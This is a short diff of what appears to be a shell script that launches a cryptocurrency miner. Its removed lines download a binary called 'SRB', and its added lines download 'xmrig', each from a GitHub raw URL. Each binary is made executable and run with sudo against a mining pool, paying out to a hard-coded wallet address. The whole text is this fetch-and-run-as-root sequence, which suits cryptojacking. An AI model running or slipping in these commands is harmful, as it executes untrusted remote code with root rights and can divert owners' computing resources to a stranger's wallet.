@@ -1,4 +1,3 @@
-wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
-chmod 500 SRB
-sudo ./SRB --disable-gpu --algorithm argon2id_chukwa --pool frosting-pool-mining.snowflake-net.com:5555 --wallet SNW1aa1fKpw9Q1AhXFo9k69ZhqDSsjHH59EJVgxsxtYmHvvJKhc5oXY94boBG56U3C94boBG56U3C94boBG56U3C94boBemmYeEZRiK5wTYChJYBGJ47eevunGr5S88fJd27Bd1Fr5aw57WCXapZw1PnmrMGsETnC3iQ8enC7kwYuDTy9mSyrQB5bG  --cpu-threads 8
-	
+wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
+chmod 500 xmrig
+sudo ./xmrig --url pool.hashvault.pro:80 --user hvs1dKm9983QgJDUeGPrVmAdmJkjZ2amMhLmSomtrPCVSm6xbLKgkH4fvkRcS3A4nsdBUFZGGDsRkC5qaXp6DsUC25FZ5sjk9k --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
